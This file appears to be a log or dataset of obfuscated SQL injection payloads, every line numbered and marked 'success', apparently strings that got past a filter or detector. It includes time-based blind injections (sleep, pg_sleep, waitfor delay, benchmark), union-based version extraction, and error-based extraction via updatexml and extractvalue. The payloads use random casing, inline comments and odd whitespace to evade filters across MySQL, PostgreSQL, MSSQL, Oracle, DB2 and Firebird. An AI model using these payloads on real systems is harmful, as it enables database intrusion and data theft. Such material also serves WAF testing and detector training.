462 success '1,  (  sELect   (  caSe WHeN   (  809 not like (sElEct 810) OR 175!=175 And True  )   thEN   (  SeLecT 1570 FrOm\x0bpg_sleep  (  (sELECt 5)   )    )    elsE 1/\t (  selEct 0  )   enD   )    )    '
463 success '1"   )    )  /**/ as nncz where/**/1428 not like 1429 '
466 success "-2569'\xa0union all/**/select 4484-- "
467 success '1" wHEre 1891 LIKE 1891 OR 4915  =    (  SELect count  (  *  )   FROm domain.domains\x0baS t1,domain.columns As t2,domain.tables As t3  )  -- '
470 success 'SELeCt CAse WheN 7951   like   1147 tHen 1 ELse null EnD-- '
472 success '1" \t )    ) \x0b/**/ AS rrms WHerE 8185   LiKe   0x1ff9 union all sEleCT null,null,null,null,null,null,null,null-- '
473 success "-8203   )    )  \x0c as eqlf where 'k.' NOT LIKE 'k.<' OR False/**/union all select 6132,6132,6132,6132,6132,6132,6132,6132,0x17f4-- "
477 success "-7371'  )   union all/**/select 4531,4531,4531#\x0bQk"
478 success "-4191\x0c )   order by 0x1# L'^e"
479 success '1"  )   As/**/nyzd WHere \'DN+I\'!=\'DN+IO\'/**/'
481 success ' SelecT * FRoM users whERE id  =  1 or ".]" oR 6836 NOT LIKE 6837 Or 0 Or False -- 1 '
482 success 'SElECt count  (  *  )\x0b  FroM domain.domains As t1,domain.columns as t2,domain.tables as/**/t3 AND    (\x0c   (     (  "%"   LIkE   " '
484 success "-9672'   )    )    As rupb wheRE 3530 NOT LIKE 0xdcb OR make_set  (  4954  =  1836,1836  )  -- "
485 success '-6546"\t )   order by\t1#/*-R*/H'
487 success "1%'  )   and elt  (  3114  =  3114 OR 1063!=1063 AND 'QLr' LIKE 'QLr' OR\x0cFalse/**/OR False AND '0x5'!='0x5{',sleep  (  (SELECT 0x5) \t/**/)    )   #/**/"
488 success '1" wherE\n(SELECT 6200)   LIKE   (SELECT 6200) aNd/**/elt  (  5460<>5461,sleep  (  5  /*<o\\aX*/)   \n)   -- '
489 success '0x1"   )    )    AS ltco WhERE 3862  =  3862 or 9027=9028 anD 4947=4947 Or 5286  =    (  seLeCt count  (  *  )   From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
490 success ' sElECT * FrOm users wheRE id  =  1 OR "{." Or 1   LIKE   1 Or \'|\' NOT\nLIKE \'|\' -- 1 io'
491 success '1  )   && (Select 0x196e)   LIKE     (  SEleCT count  (  *  )   from sysusers as sys1,sysusers aS sys2,sysusers aS sys3,sysusers AS sys4,sysusers AS sys5,sysusers aS sys6,sysusers as sys7/**/ )   '
493 success "1'||  (  select 'bzxa' whERE 6488 not like 6489 "
494 success '1" where 0x1bc6  /**/like   7110 '
495 success "-3088' or 6872\x0c =  6872 OR 0 and 'miwk'  =  'miwk "
496 success '-1591\x0cwhere 4882 NOT LIKE 4883 AND 1 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291# QM'
497 success "1 WHERE 'h' NOT LIKE 'hv' ANd 1\x0boR elt  ( /**/0x16f1  =  5873,sleep \x0b(  5   ) /**/  )   # "
500 success '1"  )   where \'L5\'=\'L5\' OR 362<>362 OR 430 NOT LIKE 430 or 6793  =    (  select/**/6793 from pg_sleep  ( \x0b5   )    )   -- '
501 success "1   ) \n  )    aS shmg WHeRe '09' NOT LIKE '09L' oR False union all SEleCt null,null,null,null,null,null,null,null,null,null# "
502 success '-7111%"/**/union all\x0bSEleCT 6083,0x17c3,6083,6083,6083,0x17c3--\t'
505 success '-8143 union/*1x*/all select 4492,4492,4492,4492,4492,4492,4492,4492,4492# '
506 success 'SeLecT * froM generate_series  (  1488,1488,CAsE WhEn  /**/(  1488   likE  \n1685  )   THEn 1 ELse 0x0 eNd  )  /**/limit 0x1-- aw'
507 success 'SeleCT  /**/(  cASe WheN   (  4043   LIkE   5276  )   theN 4043 eLsE 4043*  (  seLeCt 4043 froM information_schema.character_sets  )   End  )  # ds'
509 success '0x1/**/union all SelEcT null,null,null,null,null,null,null,null,null# .'
511 success "0x1' in/*w\tv*/boolean mode  ) \n or 0x93f   LiKE     (\n SeleCT count  (  *  )   FRom rdb$fields As t1,rdb$types as t2,rdb$collations As\x0bt3,rdb$functions As t4  ) /**/-- NT"
513 success '-2211" or 2113   LIKE \n 8885# '
514 success "0x1'+  (  select hett/**/where 7228  =  7228 AND True AND 1 OR False "
516 success "waitfor delay '0:0:5'\taND '%'   lIke   ' "
517 success "-5708 WheRE/*g-*/7155 NOT LIKE 7156 OR False or 5903  =    (  'qqpjq'||  (  sEleCt cASE 5903 WHEn 5903 thEN 1 ELse 0 EnD FROM rdb$database  )  ||'qzvzq'  )  -- "
518 success 'seLecT   (  CaSe whEn   (  9299  =  2760  )   THEn 1 elSe 9299*  (  seleCT 9299/**/fROm master..sysdatabases  )   end  )  -- '
519 success '(SELECT 1) /**6WC]*/)   OR sleep  (  5/**/ )  #\xa0CJ'
523 success "1'  )   WHEre 3262   LIke   3262 AND True union all sELect null,null,null,null,null,null,null,null,null,null# "
524 success '-8245" /**/ )    )    or 9667=9667 AND True '
526 success "-6550'  )   WhErE 1675   LiKe   1675 union all sELECt 1675,1675,1675,1675,1675,1675,1675-- "
527 success " (  SelEct * frOm   (  SEleCt  (  sleep  (  0x5   )    )     )  srmq/**/ )   &&    (    (   'cbaj'   like\xa0  'cbaj "
532 success 'sEleCT   (\t Case WhEn   (  6804   lIke   7050  )   tHen 6804 elsE cast \n(  0x1 As int  )  /  (  seLECt 0x0 frOm dual  )   enD  )   from dual-- '
533 success "1'+  (  select 'mtpt' WHeRE 7483/*1{w*/ =  7483 union all SeLECt null,null,null,null,null,null,null,null,null-- n"
534 success "-6906' where 3085 IN (3084,3085,3086) OR\x0c'a'' NOT LIKE 'a'' union all SELeCt 1839,1839,1839,1839,1839-- "
535 success "1'||  (  select 'kptj' fRoM dual WhEre 0x1403 \x0b like   0x1403/**/"
536 success '"/*\\a\n0*/" '
537 success 'SelECt   (  CASE WhEn   (  7645   lIkE   5921  ) \t THEn (SElect 7645) eLsE (sEleCt 7645)*  (  SElECt 7645 fROM information_schema.character_sets  )   End  )  # '
539 success "1   )    )  /**/\x0bas tbiq whERe 't6'!='t6-' && 0x21bb   LIKE     (  sElEct count  (  */**/ )   FrOm generate_series  (  1,(SELECT 5000000)   )    )   -- "
541 success "1  )   where 2223  =  2223 AND '\\' NOT LIKE '\\U' OR 0 "
542 success "1'+  (  select 'epza' where 8949 NOT LIKE 0x22f6 and\tmake_set  (  3782  =  0x97c,0x97c   )    )   +' "
543 success '-1653\tunion all seLeCt/**/8415,8415,8415,8415,8415,0x20df,8415,8415# '
544 success "1'+  (  select 'opqr' WheRe 2442  =  0x98a OR 1022  =    (  sElECt count  (  *  )   FrOM all_users t1,all_users t2,all_users t3,all_users t4,all_users/*5<*/t5  )  -- "
546 success "0x1%' and elt  (  'q$'<>'q$z',sleep \xa0(  0x5   )    )   /*Q*/and '%'  =/*]E\nt*/\t' "
547 success ' select *\xa0from users where id   LIKE  /*c*/1 union\xa0select @ 1a,version/**/ (    )   -- 0x1 {'
548 success "1  )  /**/aS lfra whErE '\nI' lIKe '\tI' AND updatexml  (  3393,concat  (  0x2e,0x7171706a71, \xa0(  seLect   (  elt  (  'w' NOT LIKE 'w7' and True Or 0,0x1   )    )     )  ,0x717a767a71  )  ,1161  )  --/**/"
552 success '1"  )   As xioc WHere 7260  =  7260 OR \'V\'=\'VV\' OR elt  (  5873  =  5873,sleep  (  5   )    ) \t # j'
554 success "SeLECT count  (  *  )   fRom domain.domains aS t1,domain.columns As t2,domain.tables As t3 AND    (    (   'wusq'  =  'wusq "
558 success "0x1'  )  /*V*/order by 1# "
561 success ' sElecT * FRom users wHEre id  =  1 OR  @$#  =  (SELECT 1) union select 1,version  (    )   -- (SELECT 1) v'
562 success "-5109   )\t   )     )   or make_set  (  6627   LIKE   (SELECT 7331),7331  )   AND\x0c   (    (     (  '7' NOT LIKE '7A' "
563 success "-2820' \x0b )    )    OR 0x1a17  =  8848-- "
566 success '1" where 9230   LIKE   0x240e OR 6321 NOT LIKE 6321 '
567 success "1' /**/)   aS/**/irck wHErE 0xe4c\t  LikE   (sELecT 3660) ||   (  sELeCt * FROM   (  seLecT  (  sleep  (  0x5   )    )     )  ydpu  )\x0b -- 1"
568 success "-6639'  )   as trll where 0x187f   LIKE   6271 union all select 6271,6271,6271# "
569 success ' seLect * FROM users wHEre id  =  1 OR @#"  (    =  1  OR  1  =  (sElEcT 1) -- 1 '
571 success '-0xe52"   )    )/**/   \x0c)  \x0bunion all/*[@Ce*/SElEct 4136,4136,4136-- #t['
573 success '-9496  \t)    )     )   oR elt  (  0x1d57   LIKE   3951,3951  )   aNd    (/**/   (     (  3514  =  3514 OR False '
574 success "-4775'  )   oR 3038 \n= /**/3038 "
577 success "1'\xa0where 3423 NOT\nLIKE 3424 "
579 success "1'+  (  select 'rpds' WHerE 5870  =  5870 anD 4595   LIKE   0x11f3# "
580 success '(seLeCt 1)" union/*j\x0bQ */all seLEcT\xa0null,null,null,null,null,null,null# '
582 success '(seLEcT\x0b1)"   )    )    AS hace wheRE 8785  =  8785 '
583 success "-9145'  )  \xa0as xyya where '|AO'!='|AOg' union/**/all SeLeCT/*,2b*/0x22f6,8950,8950,8950,8950,8950,8950,8950-- "
586 success '-5425 where 5933   LIKE   5933 AND 1 union all/**/select 5933,(SELECT 5933),5933-- '
589 success '-3250%" union/**/all sELect 7162,7162,7162,7162,7162,7162,7162,7162,7162-- '
590 success "1'+  (  select 'ohdf' where 7878  =  7878 AND 'T,;'' NOT LIKE 'T,;'1' and 5678  =  3277-- "
591 success '-8777"  )   As/**/lalf wherE 8257 IN (8256,8257,8258) oR/**/elt  (/**/ 4397  =  5823,0x16bf  )  -- '
592 success "-4406%' union all SELeCt 0x257f,9599,9599,9599# "
594 success "-6567'   )  /*:]KF5*/ )/**/ /*&`*/ union all select/**/0xc91# "
599 success "-6370'   )    ) /**/  AS sims wHErE 9388   lIKe   9388 union all SelECt 9388,9388,0x24ac,9388,9388,9388,9388,9388# ~"
601 success '-4817 union all sElEcT 7415,7415,7415,7415,7415,7415,7415,7415,7415# '
602 success "0x1'||  (  select 'xglm' FRoM dual wHere 'Ft*'!='Ft*&' OR 0 Or 4240   LIKE     (  SELEct 0x1090 FRom pg_sleep  (  0x5 /**/ )    )   -- "
603 success '0x1\x0cwHeRE 8546 likE 8546 OR 7920!=7920 And True rlike   (  sELEct/**/* FRoM   (  SELect  (  sleep  (  (SELecT (SEleCT 5))   )    )    /**/)  sgvo  )  -- '
605 success ' (  (SELECT 7098)  /**/LIKE   7098 AND sleep\n (  5   )  /*Rq9$*/ )  '
606 success "1'  )   where 5104 NOT LIKE 5105 OR 5344 NOT LIKE 5344 and   (  '?%x'<>'?%x['  )  *6703-- 0"
608 success "-7006' WherE 6966  =  6966 OR 0 Or False union all\x0bselECt (SElECt 6966),6966,6966,6966# f\x0b"
616 success '1/**/union all sElect\tnull,null,null,null,null,null# RAR'
617 success "-3166'||  (  select 'mtan' from dual where 9420  =  9420 OR '~yqw' NOT LIKE '~yqw' union\xa0all SeLeCT 9420# "
618 success "-4055'   )    )    as/*l(&-*/yoez where 3816  =  3816 or\t  (  8459  =  8459 OR 0 OR 'WX' NOT LIKE 'WX'  )  *4906-- "
619 success "(SELeCT 1)'   )    )    As icik WherE\x0c1440   like   0x5a0 ANd (sElEct 8189)   lIKE     (  sELEcT count  (  *  )\t  fRoM sysibm.systables As t1,sysibm.systables aS t2,sysibm.systables/**/As t3  )  -- "
620 success " select * from users where id   LIKE   '1' union select +\\.,@@VERSION -- 1' "
621 success '-4045/*vj0*/union all select/**/(SELECT 6857),6857,6857,6857,6857,6857,6857-- '
622 success 'or 0x1   LIKE   0x1\xa0/* '
624 success '1"  )   aS aifd wHERE 5962   like   5962 '
628 success ' Or 1  =  1 AND True OR ""  =   '
629 success 'seLect   (  CasE wHeN  /*0X*/(  4297 /**/ LiKe   9086 /**/)   THEN 4297 eLse 1/  (  sELECT 0  )   end  )  -- '
631 success '1 AnD sleep \x0b(  0x5  )  '
632 success '1"   )    )    as nbdc WhERE 262<>263/**/union all seleCt null,null-- '
633 success "1'||  (  select 'boxx'/**/where ':'=':' and 'D|Y' LIKE 'D|Y'-- "
634 success '1" WHeRe \'VZ&q.\' lIKE \'VZ&q.\' or   (  sEleCt * FrOM   (  SelEct  (  sleep  (  5   )    )     )  ydpu  )  -- _~'
635 success "-8881%'/**/union all select\n(SELECT 8420),8420,8420,8420,8420,8420,8420# \tu"
636 success "(sElECt 1)'||  (\xa0 select 'lzzr' WhERe\t0x9ad   LIKE   (SElEct 0x9ad) "
637 success "1' in boolean mode  )\n  waitfor/*jxRd*/delay/**/'0x0:0:(SELECT 5)'-- "
638 success "-2397   )    )    aS oizy WHeRe 'L' NOT LIKE 'L_' union all SELECT 1746,1746,(SELeCt 1746),1746,1746,1746# cC"
639 success "1'+  (  select mrdi where '\x0cHN' NOT LIKE '\x0cHNM' ANd 8594  =    (  SELEct 0x2192 FRom pg_sleep  (  5\n  )    )   -- "
644 success '1  )   AnD 0x20d7 /*Z{S*/=    (  sELECt count  (  *  )   fROm generate_series  (  1,5000000   )    )  \x0b '
645 success ' SELect * FrOM users WHErE id  =  1 oR ".@" OR 1  =  1 -- 1 '
650 success '0x1  )   aS rnfb whErE 0x965   LIke   (sElEcT 2405) Or 8514   LIKE   benchmark/**/ (  5000000,md5  (  0x544d5a4c   )    )   # '
654 success '1"/**/where 8508=8508\t'
657 success "1 and elt  (  'c' NOT LIKE 'cv',7259\x0b )   "
658 success "1' wHere 3700   liKE   3700 Or 9389 NOT In (9388,9389,9390) union all SELeCT null,null,null-- "
661 success "1'+  (  SELECt ukwc wheRE 2636 NOT LIKE/**/2637 oR   (  SEleCT * From   (  SELect  (  sleep \x0b(  5   )    )     )  sddo  )  # "
663 success "-2630'/**/  )    )    as xavw where '\r1l'<>'\r1l&' union all sELeCt 6291,6291,6291,6291,6291,6291,6291,6291,6291# Jf"
665 success '1  )   AS odqn WHEre 3910  =  3910 '
668 success '-0xa62  )   as casi where/**/7364  =  0x1cc4 or 8245  =  9651-- '
673 success 'seLECt   (  CASE whEN   (  7033  =  1594  )   tHeN 7033 ELSe 7033*\x0c (  sELEct 7033 FroM information_schema.character_sets  )   ENd  )  # '
674 success '0x1"  )   as semi where 622 NOT LIKE 623 '
676 success "0x1'  )  \x0cwHerE 0x16fb   likE   5883 Or 4411  =    (  SEleCt count  (  *  )  /**/frOM sysusers As sys1,sysusers aS sys2,sysusers AS sys3,sysusers AS sys4,sysusers as sys5,sysusers AS sys6,sysusers as sys7  )  -- "
678 success "-2418'||  (  select 'mdbt' FrOM dual WHeRE 3026  /**/LIkE   3026 anD True && 866 in (865,866,867) union all sElECt 3026,0xbd2,0xbd2,3026,(SElect 3026),3026,3026,3026,3026-- "
683 success "1'  )   as mqxb where\x0b0x1960  =  6496 and 'QcUW' NOT LIKE 'QcUW`'-- "
685 success "1%'  )   and  \n(  3020  =  3020 AND True OR False AND 'I(5}'!='I(5}j' AND True  )  *6703 and   (/**/ '%'  =  ' "
689 success ' SeLECt * FroM users/**/WhEre id  =  1.*1 union SelecT 1,banner FRom v$version WheRE rownum   lIKE   1 -- 1 '
690 success '-3420 wHere (SelecT (selECt 8485)) IN (8484,8485,8486)/**/|| make_set  (  2438   liKe   1977,1977  )  -- 5m'
691 success ' union   (  SELECt NULL, NULL,   ( /**/SElect @@version   )    )    -- 1v'
694 success "-5008' union\x0ball Select/**/1942,1942,1942,1942,1942,1942,1942,1942-- q"
695 success ' SeLect * FrOm users WhERE id  =  (SelECT 1) oR "._" OR \'U:A\' NOT LIKE \'U:AB\' and True -- 1 '
696 success "0x1' AND 8514   LIKE    /**/(  SEleCt count  (  *  )   FRom domain.domains AS t1,domain.columns as/**/t2,domain.tables AS t3  )   "
698 success '1"   )    )    AS eglv WheRE 2930<>2931 union all/**/SeLECT null# '
699 success "1   )    )    As wwkw wHEre 0x1c79   LIKE   7289 ANd 7533   like   7533 OR 'N'<>'N'-- "
701 success '-9841 WHERe 4612   like   4612 AND True union all SElEcT 4612-- PK'
702 success '-9434"  )  \x0bas cqlw where \'9\' NOT LIKE \'9-\' or 2733  =  1047-- '
706 success "1'  )   as ohcs WHeRE 9588\t =  (SeLECT 9588) OR elt  (  643 NOT LIKE 644,sleep  (  5   )    )   -- "
707 success '1  )   WHeRE 5261 \x0b=  5261 aNd elt  (  7342 IN (7341,7342,7343),sleep  (/**/ 5   )/**/   )   -- '
708 success '0x1"  )   whEre 4112   likE   4112 '
709 success '-9432   )    )    as nqya WhEre 8613 IN (8612,8613,8614) OR elt  (  (SEleCt 9242)  =  6180,6180  )  -- {$'
711 success '0x1\'  )   OR 0x93f   LIKE  \xa0  (  SELeCt count  (  *  )   from rdb$fields AS t1,rdb$types AS t2,rdb$collations As t3,rdb$functions aS t4 /**/)  -- n"'
712 success "1'  )   As syer whERe 3141 \x0b=/**/ 0xc45 rlike   (  sElEct   (  cASe wHen   (  6233  =  7567  )   TheN 1 ElSe 0x28 END   )    )   -- "
713 success '-7971   )    )    As armw whEre 9474  =  9474 or make_set  (  2667!=0xa6c,(SeLeCt 7185)  )  -- '
715 success ' sElect * fRom users wHere id\n =  1 oR 1#"? oR 1   LIKE   1 -- 1 S'
720 success ' enD AND    ( \n  (   "dmgj"  =  "dmgj '
722 success "0x1'+  (  SelecT nash whEre 3592 in (3591,3592,3593) union all\x0bsElECT null# ^"
726 success "1' where 9416   LIKE   9416 OR\t(SELECT 0) "
727 success 'SELeCt   (  caSe When   (  5418   like   6516  )   THen\t1 eLse/**/(SELeCT 5418)*  (  sElEcT 5418 fROM master..sysdatabases  )   End  )  -- '
728 success "0x1'   )    )    AND 0x2192  = \n  (  sEleCT 0x2192 fRom pg_sleep  (\x0b 5   )    ) \t -- ;"
730 success '-1487"  )   As crfi WHere 2407  =  2407 AND \'Pz:\'<>\'Pz:9\' union all seLEct 2407,2407,2407,2407,2407,2407,(SElect\t2407),2407,2407,2407-- '
731 success "(SELECT 1)'||  (\xa0 select 'wadx' whErE 4287   like   4287 AND 'L'!='L6' OR sleep  (  0x5  ) \xa0# "
738 success '0x1c%\n'
741 success '1 where 0x1543  =  5443 OR 0 '
743 success '-2817  )   wHERE 0x4bc  =  1212 or 3266  =  1102 '
746 success 'select case when 3661/**/  LIKE \t 0x2463 then 1 else null end-- '
749 success '1  )   where 0x2480   like\n  0x2480 '
752 success " select * from users where id  /**/like   '0x1'\tor \\<$ union select 1,@@VERSION -- 0x1' "
754 success "-(SELECt 2120)'/**/ )   Or 8734  =  8844# C"
761 success '1" where\xa0413<>414 AND 9891 NOT LIKE 9892 union all select null,null,null,null,null,null,null-- <'
762 success ' select * from users where id  =  1 or "  (\x0c _" OR 5254 NOT LIKE 5255 -- 1 '
764 success '1  )   as ghew wheRE 6441   LIkE   6441 union all\tSEleCt null,null-- '
765 success "(SElEct 1)' \x0c) /**/ WherE 8291   liKE /**/ 8291 "
770 success '0x1" /*%\\]A[*/ )    )  /**/ union/**/all SeLeCt null,null,null,null,null,null,null# G'
774 success 'SELEcT   (  cASe wHEn   (  3863  =  1151  )   THEn 3863 ELsE cast  (  1 As int  )  /  (  SELECT 0 FROm dual/**/ )   eNd  )   fROm dual-- '
775 success '0x1\' In boolean mode  )   oR sleep  (  0x5/**/ )/*PUV"*/ # Y1'
777 success '1/**/ )   where 7096   LIKE   7096 OR 0 '
778 success '1"   )    )    as vbpl whERE 1581<>1582 OR \'OW\' LIke \'OWb\' ANd 6969   lIKe     (  SELEcT 6969 FRoM pg_sleep  (  5   )    )   -- \'k'
779 success "-6527'   )    )    union/*_`1)d*/all select 5053,5053,5053,5053-- "
780 success 'if  ( \x0b0x788   like   0x12cb  )   select 1928 else drop function/**/ucko-- 5'
781 success ' (  SeLECt   (  cAse WhEn   (  4108  =  (SEleCT 4108)  )   theN 1 ELse 4108*  (  selECt 4108 froM information_schema.character_sets  )   EnD   )    )  '
782 success "waitfor delay '0:0:5' and   (  4614   LIKE \x0b 4614 "
783 success '-5575" union all SeLEcT/**/8665,8665,8665,8665,8665,8665,0x21d9--\n'
784 success '1  )   WhErE 0x1266  =  4710 aND 5948 liKe 5948 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  ( \tSElecT   (  casE WHen   (  3149 IN (3148,3149,3150)  ) \x0c theN 0x1 ElSE 0 EnD   )    )  /**/,0x717a767a71   )    )   ,1  )  -- S3'
785 success '1, \n(  sELECt   (  cASE whEn   (  7616   LiKE   7616 oR 8121<>8121 AND 8563 likE 8563 OR 0 Or 0 Or 8837 NOT IN (8836,8837,8838)  )   Then 1 ELSe 1/  (  sEleCt 0 \n)   End   )    )    '
786 success '1"   )    )    as ynuw where 9138   like   9138 OR 5731 LIKE 5732 '
788 success 'select * from users where/**/id   LIKE   1 + $+%1 or 2230=2230 OR 0 -- 1 '
790 success '0x1 AND (SelEcT (sELeCT 6510))  =    (  SEleCt count  (  *  )   fROm sysusers As sys1,sysusers aS sys2,sysusers AS sys3,sysusers aS sys4,sysusers as/*kl0&a*/sys5,sysusers aS sys6,sysusers aS sys7  )\t -- ixlk T'
796 success ' seLECt *\x0cfRoM users wHeRe id  =  1 Or ";[" OR 1  =  1 AND \'w\'!=\'ws\' -- 1 '
798 success "-2223'   )    )/**/   as mjwp where 7247 IN (7246,7247,7248) or 7900\n  LIKE   5838 "
802 success "1 where 'Ut'<>'Ut<' "
806 success 'SELEct count  (  *  )   froM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables As t3-- rB'
807 success '-1606\'||  (  select/**/\'qbaa\' where 3967  = \xa03967 OR 0 OR False AND 1 union all/**/select 3967,3967,3967,0xf7f,3967-- \'N"'
808 success "1  )   aND make_set  (  5730!=5731\tAND 'E^' LIKE 'E^',8899  )   "
810 success "1' where 'G' NOT LIKE 'GF'\t"
811 success '1"   )    )    AS vhrq wherE (SElECt 1690) \t= /*x_;a<*/0x69a anD elt  (  1210\x0c  lIKe   1210,sleep  (\xa0 5   )    )   -- +aB'
813 success "1'||  (  select 'xbwg' wHERe 7518  =\x0b 7518 union/**/all seLEct null,null,null,null,null,null-- "
818 success '0x1 AnD elt  (  1210   LiKe   1210 && 1 oR False,sleep  (  5   )    )   # macc '
822 success 'iif  (  4460 \x0c LIKE   1610,1,1/0/**/ ) \xa0 '
823 success ' SeLecT * FRom users WheRE id  =  1 OR @#",   lIke   1 union sElECT 1,version  (    )   --\xa00x1 uU9,_I'
825 success '0x1%"  )   or 0x3fe   Like     (  SELecT count/**/ (  * \t)   From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- @s'
826 success '-1390%"   )    )   /*~K!E?*/union all/**/select 8930,8930,8930,(SELECT 8930),8930# '
827 success '1"  )   AS tnux wheRe 4888   LIKE   4888 Or \'\nS0\'=\'\nS0\'\' rlike   (  SelECT * FrOM   (  SeleCT  (  sleep  (  5   )    )  /**/  )  vwyq  )  # '
829 success 'sELEcT CASE wHEN 2599   LIKe   7035 THen 1 ELSE null END-- '
830 success "selECT count  (/*//ip`*/ *  )   FRom domain.domains aS t1,domain.columns aS t2,domain.tables AS t3\n&&    ( \x0c  (\x0c  'zaru'  =  'zaru "
831 success '-6731"\xa0where/**/6166  =  6166 AND \'m>}U\' LIKE \'m>}U\' AND/**/1 union all select 6166,6166,6166,6166,6166,(SELECT 6166)-- W'
834 success '1" WhErE 2619  =  2619\tAnD 2823   LikE  /**/5100# '
835 success '1%"  )   ANd 8594  =    (  sEleCt 0x2192 fROm pg_sleep /**/(  5/**/ \x0c)    )   -- #>'
838 success ' sELect * FROm users WHEre id \x0c LiKe   1 oR @#"{  =  1 Or 1  =  1 -- 1 '
840 success ' select * from users where id   LIKE   1./*iv\rR*/union\x0cselect null,version  (    )   -- 1 '
843 success "-5379'\t )   union all/**/sElECT/**/4294,4294,4294-- F"
844 success "(sELECt 1)   )    )     )  \x0baND exp  (  ~  (  SElect * fRoM   (  SeLEct concat  (  0x7171706a71,  (  seLEcT   (  elt  (  'gbY'<>'gbYK' ANd 6633 Like 6633 AND 6931 IN (6930,6931,6932) OR False,0x1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    ANd    ( \x0c  (     (  0xf89  =  0xf89 And 1 "
846 success "1'+  (  select 'sacd' wheRe 0x1760  =  0x1760 union all seleCT null,null,null,null,null,null,null# X"
850 success "1'  )   and/**/elt  (  4249   like\n  4249 AND 2964<>2965,7259  )   "
851 success "1' wherE 7552\tNOT LIKE 7553 OR 6793  =    (  sEleCT 6793 FRom pg_sleep  (  5   )    )   -- "
852 success 'SElECt count  (  *  )   FROM rdb$fields AS t1,rdb$types AS t2,rdb$collations As t3,rdb$functions aS t4 &&    (    (     (  "dskh"  =  "dskh '
853 success ' (  cASE wHen 8422   lIkE   8452 THEn 0x1 Else null END  )  '
854 success "1'||  (  select 'kyhs' From/**/dual WHERE 9491   LIKE   0x2513 "
855 success 'sElEct/**/count  (  *  )   frOm sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables aS t3 aNd    (    (   "%"  =  "\xa0'
858 success 'iif  (  4638/*l+DNq*/\xa0 lIke   8258,1,1/0 /**/)   '
860 success "1'+\t (  SelEct eluw wHERe 0x1842/**/ = \x0b6210 "
861 success '1"  )   wheRe \'1d\' NOT LIKE \'1dB\' OR 1744 NOT IN (1743,1744,1745) && exp  (  ~  (  seLEcT * FRom   (  SEleCT concat  (  0x7171706a71,  (  SEleCT   (  elt \xa0(  3253 iN (3252,3253,3254),1   )    ) /**/   )  ,0x717a767a71,0x78   )    )   x\t  )    )   -- \x0czI'
863 success ' select * from users where id   LIKE   1 *\\. union select null,@@VERSION -- 1 '
865 success ' sElEct * FrOm users WhErE id  =  1 OR 1#"? union seLecT \'a\',version  (    )   -- 1 ~'
866 success '-0x1fc0"   )    )    As ovjz/**/wHERe 0x1ccf   LIke   7375 union all SELEcT 7375,7375,7375,7375,7375,7375,7375,7375,7375-- c>'
867 success "1  )   wHERE 'AIS'='AIS' OR 3426 LIKE 3427 OR 489 LIKE 490 Or 1921!=1921 AnD 1 anD 'z'!='zZ' oR 7417   LIKE     (  seLECt count  (  *  )   frOM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables as t3  )/**/ -- C"
868 success '-9958"  )  /**/as jzvq where 3741   LIKE   3741 OR 0 union all select 3741,3741,3741# X\n'
869 success '-5539"\xa0 )   union/**/all select/**/6189,6189,(SELECT 6189),6189,6189,6189,6189,6189,6189-- '
870 success 'sELEct count  (  *  )   fROM sysibm.systables AS t1,sysibm.systables as t2,sysibm.systables AS t3 &&   (  "lsvg"/**/LIKe "lsvg '
876 success '(SELECT 1)"   )    )    as xcyo where 3161 NOT LIKE 3162 OR False '
880 success "-9739' or 8571  =  8571 OR 8505 NOT LIKE 8505-- "
883 success '1  )   AS tbve WhERE 0x12dc  \x0clIKe   4828 '
884 success "1' in boolean mode  )   && (SELECT 0x954)  =  benchmark  (  0x4c4b40,md5  (  0x6d457153  \n)  /**//*'wb0*/)   # ]J"
885 success "iif  (  5257   LIKE   5257 AND 'hv'='hv',1,1/0x0  ) \n "
888 success 'SeLeCt\t  (  CaSE WheN   (  8978  =  1426  )   tHEn 1 ELSe 8978*  (  SeLECT 8978/**/fROm master..sysdatabases  )   END  )  -- '
889 success '1   )    )  \x0c AS gxvp wHere 3865 \n liKe   (sElEcT 0xf19) '
890 success '-(SELECT 7395)%"\x0border\x0cby 1-- '
891 success " (  SeLecT * fROm   (  SeLeCT  (  sleep  (  5   )    )     )  srmq  ) /*CW-\\]*/ And 'fdgq'  =  'fdgq "
892 success "-1236'+  (  select 'fbgh' where 'm:t' NOT LIKE 'm:to' union\tall select 3896,3896,3896,3896,3896,3896,0xf38,3896,3896-- "
895 success "-8521'+  (  SeLeCT ucim whEre 9003  =  9003 AND True anD True AND 1 union all SElEcT 9003-- "
896 success '-2013"   )    )    aS kisy wHERE 3802  =  3802 ANd 5464 LIkE 5464 OR \'I\'<>\'I\' oR 5903  =    (  \'qqpjq\' Or   (  SeleCt CaSE 5903 when 5903 THEn\n1/*-N*/elsE 0 eND fRom rdb$database  )  ||\'qzvzq\'  )  -- \r;'
897 success ' select * from users where id   LIKE   0x1 +\\. union select null,@@VERSION -- (SELECT 0x1) '
899 success '1\twHERe 7906  =  7906 Or 8156   LIkE     (  sElEcT count  (  *  )   FrOm generate_series  (  1,5000000   )    ) /*{{]h(*/ -- '
900 success '-9265"/**//**/)   OR 7834 \t lIKe   1685 '
901 success "1'+  (  select 'xqjx'/**/where 7048  =  7048 and '&'<>'&S' OR 'D0}'='D0}p'-- "
903 success 'Select   (  CaSe When   (  3537   lIkE   0x1462  )   tHen (sELeCT 3537) ELse 3537*  (  sELect (SeLEcT 3537) fRom mysql.db  )   End  )  # S\r'
905 success "-0x1f5c%'   )/**/   )   \t/**/)   OR 0x13b2   LIKE   5214 "
906 success '-5640"   )\x0c   )    || (SelECT 9792)   lIkE   0xaa8-- '
907 success '0x1"  )   aS uyns WHerE 0x128f   lIkE   0x128f And   (  sEleCt * frOM \xa0 ( /*0x9*/SeLeCt  (\t sleep  (  0x5   )    )     )  fzno  )\xa0 --\ta[-'
909 success "1'   )    )    As babx Where (SELECt 2494)   LIKE   0x9be Or 1022  =    (  SelECT count  (  *  )   FrOm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- jQ"
910 success "1'   )    )   /**/as iuta wHeRE 0x5ca   LIkE  \x0b1482 or 0 "
911 success '  (  SeLEcT count  (  *  )/*Wb_*/  froM sysibm.systables aS t1,sysibm.systables AS t2,sysibm.systables aS\x0ct3  )   '
